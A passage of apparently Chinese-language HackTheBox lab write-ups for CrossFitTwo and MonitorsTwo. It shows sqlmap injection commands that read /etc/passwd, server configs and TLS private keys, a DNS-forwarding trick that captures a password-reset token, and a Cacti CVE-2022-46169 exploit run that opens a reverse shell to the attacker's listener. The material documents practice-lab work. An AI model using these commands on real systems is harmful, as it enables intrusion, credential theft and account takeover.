david.palmer@crossfit.htb   | fff34363f4d15e958f0fb9a7c2e7cc550a5672321d54b5712cd6e4fa17cd2ac8 | administrator |\n| 2  | will.smith@crossfit.htb     | 06b4daca29092671e44ef8fad8ee38783b4294d9305853027d1b48029eac0683 | wsmith        |\n| 3  | maria.williams@crossfit.htb | fe46198cb29909e5dd9f61af986ca8d6b4b875337261bdaa5204f29582462a9c | mwilliams     |\n| 4  | jack.parker@crossfit.htb    | 4de9923aba6554d148dbcd3369ff7c6e71841286e5106a69e250f779770b3648 | jparker       |\n+----+-----------------------------+------------------------------------------------------------------+---------------+\n```\n测试了一下，无法解密出来，让我们换个思路\n\n让我们使用sql注入读取一下文件试试 > OpenBSD相关配置文件\n\n> https://man.openbsd.org/?query=config&apropos=1&sec=5&arch=default&manpath=OpenBSD-current\n\n### /etc/passwd\n```Plain Text\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1  --batch --technique=B --threads=10 --file-read=\"/etc/passwd\"\n\nroot:*:0:0:Charlie &:/root:/bin/ksh\ndaemon:*:1:1:The devil himself:/root:/sbin/nologin\noperator:*:2:5:System &:/operator:/sbin/nologin\nbin:*:3:7:Binaries Commands and Source:/:/sbin/nologin\nbuild:*:21:21:base and xenocara build:/var/empty:/bin/ksh\nsshd:*:27:27:sshd privsep:/var/empty:/sbin/nologin\n_portmap:*:28:28:portmap:/var/empty:/sbin/nologin\n_identd:*:29:29:identd:/var/empty:/sbin/nologin\n_rstatd:*:30:30:rpc.rstatd:/var/empty:/sbin/nologin\n_rusersd:*:32:32:rpc.rusersd:/var/empty:/sbin/nologin\n_fingerd:*:33:33:fingerd:/var/empty:/sbin/nologin\n_x11:*:35:35:X Server:/var/empty:/sbin/nologin\n_unwind:*:48:48:Unwind Daemon:/var/empty:/sbin/nologin\n_switchd:*:49:49:Switch Daemon:/var/empty:/sbin/nologin\n_traceroute:*:50:50:traceroute privdrop user:/var/empty:/sbin/nologin\n_ping:*:51:51:ping privdrop user:/var/empty:/sbin/nologin\n_unbound:*:53:53:Unbound Daemon:/var/unbound:/sbin/nologin\n_dpb:*:54:54:dpb privsep:/var/empty:/sbin/nologin\n_pbuild:*:55:55:dpb build user:/nonexistent:/sbin/nologin\n_pfetch:*:56:56:dpb fetch user:/nonexistent:/sbin/nologin\n_pkgfetch:*:57:57:pkg fetch user:/nonexistent:/sbin/nologin\n_pkguntar:*:58:58:pkg untar user:/nonexistent:/sbin/nologin\n_spamd:*:62:62:Spam Daemon:/var/empty:/sbin/nologin\nwww:*:67:67:HTTP Server:/var/www:/sbin/nologin\n_isakmpd:*:68:68:isakmpd privsep:/var/empty:/sbin/nologin\n_rpki-client:*:70:70:rpki-client user:/nonexistent:/sbin/nologin\n_syslogd:*:73:73:Syslog Daemon:/var/empty:/sbin/nologin\n_pflogd:*:74:74:pflogd privsep:/var/empty:/sbin/nologin\n_bgpd:*:75:75:BGP Daemon:/var/empty:/sbin/nologin\n_tcpdump:*:76:76:tcpdump privsep:/var/empty:/sbin/nologin\n_dhcp:*:77:77:DHCP programs:/var/empty:/sbin/nologin\n_mopd:*:78:78:MOP Daemon:/var/empty:/sbin/nologin\n_tftpd:*:79:79:TFTP Daemon:/var/empty:/sbin/nologin\n_rbootd:*:80:80:rbootd Daemon:/var/empty:/sbin/nologin\n_ppp:*:82:82:PPP utilities:/var/empty:/sbin/nologin\n_ntp:*:83:83:NTP Daemon:/var/empty:/sbin/nologin\n_ftp:*:84:84:FTP Daemon:/var/empty:/sbin/nologin\n_ospfd:*:85:85:OSPF Daemon:/var/empty:/sbin/nologin\n_hostapd:*:86:86:HostAP Daemon:/var/empty:/sbin/nologin\n_dvmrpd:*:87:87:DVMRP Daemon:/var/empty:/sbin/nologin\n_ripd:*:88:88:RIP Daemon:/var/empty:/sbin/nologin\n_relayd:*:89:89:Relay Daemon:/var/empty:/sbin/nologin\n_ospf6d:*:90:90:OSPF6 Daemon:/var/empty:/sbin/nologin\n_snmpd:*:91:91:SNMP Daemon:/var/empty:/sbin/nologin\n_ypldap:*:93:93:YP to LDAP Daemon:/var/empty:/sbin/nologin\n_rad:*:94:94:IPv6 Router Advertisement Daemon:/var/empty:/sbin/nologin\n_smtpd:*:95:95:SMTP Daemon:/var/empty:/sbin/nologin\n_rwalld:*:96:96:rpc.rwalld:/var/empty:/sbin/nologin\n_nsd:*:97:97:NSD Daemon:/var/empty:/sbin/nologin\n_ldpd:*:98:98:LDP Daemon:/var/empty:/sbin/nologin\n_sndio:*:99:99:sndio privsep:/var/empty:/sbin/nologin\n_ldapd:*:100:100:LDAP Daemon:/var/empty:/sbin/nologin\n_iked:*:101:101:IKEv2 Daemon:/var/empty:/sbin/nologin\n_iscsid:*:102:102:iSCSI Daemon:/var/empty:/sbin/nologin\n_smtpq:*:103:103:SMTP Daemon:/var/empty:/sbin/nologin\n_file:*:104:104:file privsep:/var/empty:/sbin/nologin\n_radiusd:*:105:105:RADIUS Daemon:/var/empty:/sbin/nologin\n_eigrpd:*:106:106:EIGRP Daemon:/var/empty:/sbin/nologin\n_vmd:*:107:107:VM Daemon:/var/empty:/sbin/nologin\n_tftp_proxy:*:108:108:tftp proxy daemon:/nonexistent:/sbin/nologin\n_ftp_proxy:*:109:109:ftp proxy daemon:/nonexistent:/sbin/nologin\n_sndiop:*:110:110:sndio privileged user:/var/empty:/sbin/nologin\n_syspatch:*:112:112:syspatch unprivileged user:/var/empty:/sbin/nologin\n_slaacd:*:115:115:SLAAC Daemon:/var/empty:/sbin/nologin\nnobody:*:32767:32767:Unprivileged user:/nonexistent:/sbin/nologin\n_mysql:*:502:502:MySQL Account:/nonexistent:/sbin/nologin\nlucille:*:1002:1002:,,,:/home/lucille:/bin/csh\nnode:*:1003:1003::/home/node:/bin/ksh\n_dbus:*:572:572:dbus user:/nonexistent:/sbin/nologin\n_redis:*:686:686:redis account:/var/redis:/sbin/nologin\ndavid:*:1004:1004:,,,:/home/david:/bin/csh\njohn:*:1005:1005::/home/john:/bin/csh\nftp:*:1006:1006:FTP:/home/ftp:/sbin/nologin\n```\n### /etc/login.conf\n根据配置文件，使用有yubikey：\n\n```Plain Text\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1  --batch --technique=B --threads=10 --file-read=\"/etc/login.conf\"\n\n# $OpenBSD: login.conf,v 1.16 2020/06/23 15:45:34 naddy Exp $\n\n#\n# Sample login.conf file.  See login.conf(5) for details.\n#\n\n#\n# Standard authentication styles:\n#\n# passwd        Use only the local password file\n# chpass        Do not authenticate, but change user's password (change\n#               the YP password if the user has one, else change the\n#               local password)\n# lchpass       Do not login; change user's local password instead\n# radius        Use radius authentication\n# reject        Use rejected authentication\n# skey          Use S/Key authentication\n# activ         ActivCard X9.9 token authentication\n# crypto        CRYPTOCard X9.9 token authentication\n# snk           Digital Pathways SecureNet Key authentication\n# tis           TIS Firewall Toolkit authentication\n# token         Generic X9.9 token authentication\n# yubikey       YubiKey authentication\n#\n\n# Default allowed authentication styles\nauth-defaults:auth=passwd,skey:\n\n# Default allowed authentication styles for authentication type ftp\nauth-ftp-defaults:auth-ftp=passwd:\n\n#\n# The default values\n# To alter the default authentication types change the line:\n#       :tc=auth-defaults:\\\n# to read something like: (enables passwd, \"myauth\", and activ)\n#       :auth=passwd,myauth,activ:\\\n# Any value changed in the daemon class should be reset in default\n# class.\n#\ndefault:\\\n        :path=/usr/bin /bin /usr/sbin /sbin /usr/X11R6/bin /usr/local/bin /usr/local/sbin:\\\n        :umask=022:\\\n        :datasize-max=768M:\\\n        :datasize-cur=768M:\\\n        :maxproc-max=256:\\\n        :maxproc-cur=128:\\\n        :openfiles-max=102400:\\\n        :openfiles-cur=102400:\\\n        :stacksize-cur=4M:\\\n        :localcipher=blowfish,a:\\\n        :tc=auth-defaults:\\\n        :tc=auth-ftp-defaults:\n\n#\n# Settings used by /etc/rc and root\n# This must be set properly for daemons started as root by inetd as well.\n# Be sure to reset these values to system defaults in the default class!\n#\ndaemon:\\\n        :ignorenologin:\\\n        :datasize=infinity:\\\n        :maxproc=infinity:\\\n        :openfiles-max=102400:\\\n        :openfiles-cur=102400:\\\n        :stacksize-cur=8M:\\\n        :auth-ssh=yubikey:\\\n        :auth-su=reject:\\\n        :tc=default:\n\n#\n# Staff have fewer restrictions and can login even when nologins are set.\n#\nstaff:\\\n        :datasize-cur=1536M:\\\n        :datasize-max=infinity:\\\n        :maxproc-max=512:\\\n        :maxproc-cur=256:\\\n        :ignorenologin:\\\n        :requirehome@:\\\n        :tc=default:\n\n#\n# Authpf accounts get a special motd and shell\n#\nauthpf:\\\n        :welcome=/etc/motd.authpf:\\\n        :shell=/usr/sbin/authpf:\\\n        :tc=default:\n\n#\n# Building ports with DPB uses raised limits\n#\npbuild:\\\n        :datasize-max=infinity:\\\n        :datasize-cur=8192M:\\\n        :maxproc-max=1024:\\\n        :maxproc-cur=384:\\\n        :priority=5:\\\n        :tc=default:\n\n#\n# Override resource limits for certain daemons started by rc.d(8)\n#\nbgpd:\\\n        :openfiles=512:\\\n        :tc=daemon:\n\nunbound:\\\n        :openfiles=512:\\\n        :tc=daemon:\n\n```\n### /etc/ssh/sshd\\_config\nroot需要公钥和密码，非root需要密码\n\n```Plain Text\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1  --batch --technique=B --threads=10 --file-read=\"/etc/ssh/sshd_config\"\n\n#   $OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $\n\n# This is the sshd server system-wide configuration file.  See\n# sshd_config(5) for more information.\n\n# The strategy used for options in the default sshd_config shipped with\n# OpenSSH is to specify options with their default value where\n# possible, but leave them commented.  Uncommented options override the\n# default value.\n\n#Port 22\n#AddressFamily any\n#ListenAddress 0.0.0.0\n#ListenAddress ::\n\n#HostKey /etc/ssh/ssh_host_rsa_key\n#HostKey /etc/ssh/ssh_host_ecdsa_key\n#HostKey /etc/ssh/ssh_host_ed25519_key\n\n# Ciphers and keying\n#RekeyLimit default none\n\n# Logging\n#SyslogFacility AUTH\n#LogLevel INFO\n\n# Authentication:\n\n#LoginGraceTime 2m\nPermitRootLogin yes\n#StrictModes yes\n#MaxAuthTries 6\n#MaxSessions 10\n\n#PubkeyAuthentication yes\n\n# The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2\n# but this is overridden so installations will only check .ssh/authorized_keys\nAuthorizedKeysFile  .ssh/authorized_keys\n\n#AuthorizedPrincipalsFile none\n\n#AuthorizedKeysCommand none\n#AuthorizedKeysCommandUser nobody\n\n# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts\n#HostbasedAuthentication no\n# Change to yes if you don't trust ~/.ssh/known_hosts for\n# HostbasedAuthentication\n#IgnoreUserKnownHosts no\n# Don't read the user's ~/.rhosts and ~/.shosts files\n#IgnoreRhosts yes\n\n# To disable tunneled clear text passwords, change to no here!\n#PasswordAuthentication yes\n#PermitEmptyPasswords no\n\n# Change to no to disable s/key passwords\n#ChallengeResponseAuthentication yes\n\n#AllowAgentForwarding yes\n#AllowTcpForwarding yes\n#GatewayPorts no\n#X11Forwarding no\n#X11DisplayOffset 10\n#X11UseLocalhost yes\n#PermitTTY yes\n#PrintMotd yes\n#PrintLastLog yes\n#TCPKeepAlive yes\n#PermitUserEnvironment no\n#Compression delayed\n#ClientAliveInterval 0\n#ClientAliveCountMax 3\n#UseDNS no\n#PidFile /var/run/sshd.pid\n#MaxStartups 10:30:100\n#PermitTunnel no\n#ChrootDirectory none\n#VersionAddendum none\n\n# no default banner path\n#Banner none\n\n# override default of no subsystems\nSubsystem   sftp    /usr/libexec/sftp-server\n\n# Example of overriding settings on a per-user basis\n#Match User anoncvs\n#   X11Forwarding no\n#   AllowTcpForwarding no\n#   PermitTTY no\n#   ForceCommand cvs server\n\nMatch User root\n    AuthenticationMethods publickey,password\nMatch User *,!root\n    AuthenticationMethods password\n```\n### /etc/httpd.conf\n根据配置文件，除了chat和employees还有其他的：\n\n```Plain Text\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1  --batch --technique=B --threads=10 --file-read=\"/etc/httpd.conf\"\n\n# $OpenBSD: httpd.conf,v 1.20 2018/06/13 15:08:24 reyk Exp $\n\ntypes {\n    include \"/usr/share/misc/mime.types\"\n}\n\nserver \"0.0.0.0\" {\n        no log\n        listen on lo0 port 8000\n\n        root \"/htdocs\"\n        directory index index.php\n\n        location \"*.php*\" {\n                fastcgi socket \"/run/php-fpm.sock\"\n        }\n}\n\nserver \"employees\" {\n        no log\n        listen on lo0 port 8001\n\n        root \"/htdocs_employees\"\n        directory index index.php\n\n        location \"*.php*\" {\n                fastcgi socket \"/run/php-fpm.sock\"\n        }\n}\n\nserver \"chat\" {\n        no log\n        listen on lo0 port 8002\n\n        root \"/htdocs_chat\"\n        directory index index.html\n\n        location match \"^/home$\" {\n            request rewrite \"/index.html\"\n        }\n        location match \"^/login$\" {\n            request rewrite \"/index.html\"\n        }\n        location match \"^/chat$\" {\n            request rewrite \"/index.html\"\n        }\n        location match \"^/favicon.ico$\" {\n            request rewrite \"/images/cross.png\"\n        }\n}\n```\n### /etc/relayd.conf\n得到crossfit-club.htb，加hosts：\n\n```Plain Text\necho 10.10.10.232 crossfit-club.htb >> /etc/hosts\n```\n```Plain Text\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1  --batch --technique=B --threads=10 --file-read=\"/etc/relayd.conf\"\n\ntable<1>{127.0.0.1}\ntable<2>{127.0.0.1}\ntable<3>{127.0.0.1}\ntable<4>{127.0.0.1}\nhttp protocol web{\n        pass request quick header \"Host\" value \"*crossfit-club.htb\" forward to <3>\n        pass request quick header \"Host\" value \"*employees.crossfit.htb\" forward to <2>\n        match request path \"/*\" forward to <1>\n        match request path \"/ws*\" forward to <4>\n        http websockets\n}\n\ntable<5>{127.0.0.1}\ntable<6>{127.0.0.1 127.0.0.2 127.0.0.3 127.0.0.4}\nhttp protocol portal{\n        pass request quick path \"/\" forward to <5>\n        pass request quick path \"/index.html\" forward to <5>\n        pass request quick path \"/home\" forward to <5>\n        pass request quick path \"/login\" forward to <5>\n        pass request quick path \"/chat\" forward to <5>\n        pass request quick path \"/js/*\" forward to <5>\n        pass request quick path \"/css/*\" forward to <5>\n        pass request quick path \"/fonts/*\" forward to <5>\n        pass request quick path \"/images/*\" forward to <5>\n        pass request quick path \"/favicon.ico\" forward to <5>\n        pass forward to <6>\n        http websockets\n}\n\nrelay web{\n        listen on \"0.0.0.0\" port 80\n        protocol web\n        forward to <1> port 8000\n        forward to <2> port 8001\n        forward to <3> port 9999\n        forward to <4> port 4419\n}\n\nrelay portal{\n        listen on 127.0.0.1 port 9999\n        protocol portal\n        forward to <5> port 8002\n        forward to <6> port 5000 mode source-hash\n}\n```\n吐槽一下，注入读文件是真的慢，慢的有点离谱了\n\n咱们访问一下新发现的页面\n\n![](Hackthebox-CrossFitTwo未完成/f555eb60-57c6-4c73-a52f-f701dd0d0a24.png)\n\n似乎又是一个登录页面，但咱们依然没有账号密码\n\n![](Hackthebox-CrossFitTwo未完成/d89604a2-83ee-4646-bd88-60d2f70484bd.png)\n\n本想注册一个账号，却发现被禁止注册了\n\n![](Hackthebox-CrossFitTwo未完成/0e480630-e41c-4857-833d-3f3d55df399c.png)\n\n在流量内发现请求了\n\n```Plain Text\n/api/auth\n```\n，咱们fuzz一下其他api看看\n\n```Plain Text\ngobuster dir -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -e -t 20 -x json -u http://crossfit-club.htb/api/\n\n┌──(root💀root)-[~/Desktop]\n└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -e -t 20 -x json -u http://crossfit-club.htb/api/\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://crossfit-club.htb/api/\n[+] Method:                  GET\n[+] Threads:                 20\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/api/objects.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Extensions:              json\n[+] Expanded:                true\n[+] Timeout:                 10s\n===============================================================\n2021/08/02 19:14:30 Starting gobuster in directory enumeration mode\n===============================================================\nhttp://crossfit-club.htb/api/auth                 (Status: 200) [Size: 66]\nhttp://crossfit-club.htb/api/ping                 (Status: 200) [Size: 71]\n\n===============================================================\n2021/08/02 19:15:51 Finished\n===============================================================\n```\n```Plain Text\ngobuster dir -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -e -t 20 -x json -m POST -u http://crossfit-club.htb/api/\n\n┌──(root💀root)-[~/Desktop]\n└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -e -t 20 -x json -m POST -u http://crossfit-club.htb/api/\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://crossfit-club.htb/api/\n[+] Method:                  POST\n[+] Threads:                 20\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/api/objects.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Extensions:              json\n[+] Expanded:                true\n[+] Timeout:                 10s\n===============================================================\n2021/08/02 19:22:33 Starting gobuster in directory enumeration mode\n===============================================================\nhttp://crossfit-club.htb/api/Login                (Status: 200) [Size: 50]\nhttp://crossfit-club.htb/api/login                (Status: 200) [Size: 50]\nhttp://crossfit-club.htb/api/signup               (Status: 200) [Size: 50]\n\n===============================================================\n2021/08/02 19:23:53 Finished\n===============================================================\n```\n在api中发现了signup，咱们访问一下看看\n\n![](Hackthebox-CrossFitTwo未完成/0b0c69c0-5a0b-4766-8716-e614f77eca9a.png)\n\n访问后提示无法GET获取\n\n```Plain Text\n/api/signup\n```\n，咱们使用burp抓包试试\n\n![](Hackthebox-CrossFitTwo未完成/76bc805d-1333-4471-91a0-52e51d6de72f.png)\n\n这边提示咱们CSRF Token不对\n\n![](Hackthebox-CrossFitTwo未完成/e04e85f7-e800-41d5-b37c-ec7f2a06736f.png)\n\n稍微修改后，提示只有管理员可以注册用户\n\n```Plain Text\nPOST /api/signup HTTP/1.1\nHost: crossfit-club.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: connect.sid=s%3Ae44z5Xt6fe5g1VLuMNHs-ZD7sFPh8C4k.NEClY9BvwLeMaL3zZCfxvxxFZfHp6iak0Xa8QLTO1pw\nUpgrade-Insecure-Requests: 1\nContent-Length: 113\nX-CSRF-Token: xmiei8Ex-OKmxFdQOUaVH_4aoIjuUT-dz6HQ\n\n{\n    \"username\":\"lucifiel\",\n    \"password\":\"lucifiel123\",\n    \"email\":\"lucifiel@crossfit.htb\",\n    \"confirm\":\"lucifiel123\"\n}\n```\n咱们把目光放在8953端口上，这个是`Unbound`的`control-part`端口，咱们通过sql去读取 > https://man.openbsd.org/unbound.conf\n\n### /var/unbound/etc/unbound.conf\n```Plain Text\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=\"/var/unbound/etc/unbound.conf\"\n\nserver:\n        interface: 127.0.0.1\n        interface: ::1\n        access-control: 0.0.0.0/0 refuse\n        access-control: 127.0.0.0/8 allow\n        access-control: ::0/0 refuse\n        access-control: ::1 allow\n        hide-identity: yes\n        hide-version: yes\n        msg-cache-size: 0\n        rrset-cache-size: 0\n        cache-max-ttl: 0\n        cache-max-negative-ttl: 0\n        auto-trust-anchor-file: \"/var/unbound/db/root.key\"\n        val-log-level: 2\n        aggressive-nsec: yes\n        include: \"/var/unbound/etc/conf.d/local_zones.conf\"\n\nremote-control:\n        control-enable: yes\n        control-interface: 0.0.0.0\n        control-use-cert: yes\n        server-key-file: \"/var/unbound/etc/tls/unbound_server.key\"\n        server-cert-file: \"/var/unbound/etc/tls/unbound_server.pem\"\n        control-key-file: \"/var/unbound/etc/tls/unbound_control.key\"\n        control-cert-file: \"/var/unbound/etc/tls/unbound_control.pem\"\n```\n咱们需要下载下面这些文件\n\n```Plain Text\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=\"/var/unbound/etc/tls/unbound_server.pem\"\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=\"/var/unbound/etc/tls/unbound_control.key\"\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=\"/var/unbound/etc/tls/unbound_control.pem\"\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=\"/var/unbound/etc/tls/unbound_server.key\"\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=\"/etc/httpd.conf\"\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=\"/etc/passwd\"\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=\"/var/unbound/etc/unbound.conf\"\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=\"/etc/relayd.conf\"\n```\n修改`crossfit.conf`文件内容\n\n```Plain Text\nremote-control:\n    control-enable: yes\n    control-use-cert: \"yes\"\n    server-cert-file: \"/etc/unbound/unbound_server.pem\"\n    control-key-file: \"/etc/unbound/unbound_control.key\"\n    control-cert-file: \"/etc/unbound/unbound_control.pem\"\n```\n将所有证书文件都放到`/etc/unbound/`目录下\n\n然后检查一下状态\n\n```Plain Text\nunbound-control -c crossfit.conf -s 10.10.10.232 status\n\n┌──(root💀root)-[~/Desktop]\n└─# unbound-control -c crossfit.conf -s 10.10.10.232 status\nversion: 1.11.0\nverbosity: 1\nthreads: 1\nmodules: 2 [ validator iterator ]\nuptime: 44 seconds\noptions: control(ssl)\nunbound (pid 55403) is running...\n```\n从`relayd`配置文件中，知道了我们可以配置的是`*employees.crossfit.htb`，现在我们操作起来\n\n我们在前面添加其他字符，并且控制对应dns，以达到密码劫持充值链接的目的\n\n将dns请求转发到我们的dns服务器\n\n```Plain Text\nunbound-control -s 10.10.10.232 forward_add +i xemployees.crossfit.htb 10.10.14.27@53\n```\n将`xemployees.crossfit.htb`添加到`/etc/hosts`\n\n```Plain Text\necho 10.10.10.232 xemployees.crossfit.htb >> /etc/hosts\n```\n使用dnschef进行劫持 > https://github.com/LucifielHack/dnschef\n\n本地使用nc监听80端口\n\n```Plain Text\nnc -nvlp 80\n```\n然后unbound添加一条规则，将dns请求转发到我们的dns服务器\n\n```Plain Text\nunbound-control -c crossfit.conf -s 10.10.10.232 forward_add +i xemployees.crossfit.htb 10.10.14.2\n```\n使用如下命令来获得重置链接\n\n```Plain Text\nsudo python3 dnschef.py -i 10.10.14.2 --fakedomains xemployees.crossfit.htb --fakeip 127.0.0.1\nsudo python3 dnschef.py -i 10.10.14.2 --fakedomains xemployees.crossfit.htb --fakeip 10.10.14.2\n```\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# nc -nvlp 80\nlistening on [any] 80 ...\nconnect to [10.10.14.2] from (UNKNOWN) [10.10.10.232] 1352\nGET /password-reset.php?token=ffe51814f0831927a5bff7ad15a09cdac20d68afe0d4945f4b32ead391d6ceeb03a9e25a07299c49947776cfd9f2ab6422260817233b1818ae8b86ca273de465 HTTP/1.1\nHost: xemployees.crossfit.htb\nUser-Agent: Mozilla/5.0 (X11; OpenBSD amd64; rv:82.0) Gecko/20100101 Firefox/82.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nReferer: http://crossfit-club.htb/\nUpgrade-Insecure-Requests: 1\n```\n成功返回token值","tags":["Hackthebox"]},{"title":"MonitorsTwo - Hackthebox","url":"/2023/05/07/Hackthebox/Easy/Hackthebox-MonitorsTwo/","content":"\n# Hackthebox - MonitorsTwo\n# 靶场信息\n![](Hackthebox-MonitorsTwo/i7buleFIoWpTCOSd5rZGbdlBp5jky3diopVTlFUmg_s.png)\n\n# 靶场难度\n![](Hackthebox-MonitorsTwo/WkIqj62gi9do_ov2iu2d1pk4ip3nteUupy7AK53AXN0.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# nmap -sC -sV -A -p- --min-rate=10000 10.10.11.211\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-05-08 07:05 CST\nNmap scan report for 10.10.11.211\nHost is up (0.15s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)\n|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)\n|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-title: Login to Cacti\n|_http-server-header: nginx/1.18.0 (Ubuntu)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=5/8%OT=22%CT=1%CU=41839%PV=Y%DS=2%DC=T%G=Y%TM=64582EE3\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(\nOS:O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11\nOS:NW7%O6=M537ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(\nOS:R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=\nOS:S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 199/tcp)\nHOP RTT       ADDRESS\n1   149.95 ms 10.10.16.1\n2   193.70 ms 10.10.11.211\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 35.93 seconds\n```\n## Http\n![](Hackthebox-MonitorsTwo/dl47lRfOTAiRq0PdOJjXsfiV8ErIJA9AoBK1hlDjQLc.png)\n\n通过 http 页面得至该 cms 为 `Cacti 1.2.22` ，去搜索一下看看有没有漏洞\n\n![](Hackthebox-MonitorsTwo/uroHAWRGpe33d4Fj1Es_bmeQD-lepABDdzlau3RdbyY.png)\n\n找到一个 `CVE-2022-46169` ，下载下来使用\n\n> [https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22)\n\n# 漏洞利用\n使用 nc 开启一个端口监听\n\n```bash\nnc -nvlp 4444\n```\n然后执行 exp\n\n```bash\n┌──(root㉿kali)-[~/Desktop/CVE-2022-46169-CACTI-1.2.22]\n└─# python3 CVE-2022-46169.py -u http://10.10.11.211/ --LHOST=10.10.16.23 --LPORT=4444\nChecking...\nThe target is vulnerable. Exploiting...\nBruteforcing the host_id and local_data_ids\nBruteforce Success!!\n```\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# rlwrap nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.16.23] from (UNKNOWN) [10.10.11.211] 38920\nbash: cannot set terminal process group (1): Inappropriate ioctl for device\nbash: no job control in this shell\nbash-5.1$ whoami&&id\nwhoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n成功得到一个 shell\n\n# 权限提升\n## User\n```bash\nbash-5.1$ cd /\ncd /\nbash-5.1$ ls -la\nls -la\ntotal 88\ndrwxr-xr-x   1 root root 4096 Mar 21 10:49 .\ndrwxr-xr-x   1 root root 4096 Mar 21 10:49 ..\n-rwxr-xr-x   1 root root    0 Mar 21 10:49 .dockerenv\ndrwxr-xr-x   1 root root 4096 Mar 22 13:21 bin\ndrwxr-xr-x   2 root root 4096 Mar 22 13:21 boot\ndrwxr-xr-x   5 root root  340 May  7 22:45 dev\n-rw-r--r--   1 root root  648 Jan  5 11:37 entrypoint.sh\ndrwxr-xr-x   1 root root 4096 Mar 21 10:49 etc\ndrwxr-xr-x   2 root root 4096 Mar 22 13:21 home\ndrwxr-xr-x   1 root root 4096 Nov 15 04:13 lib\ndrwxr-xr-x   2 root root 4096 Mar 22 13:21 lib64\ndrwxr-xr-x   2 root root 4096 Mar 22 13:21 media\ndrwxr-xr-x   2 root root 4096 Mar 22 13:21 mnt\ndrwxr-xr-x  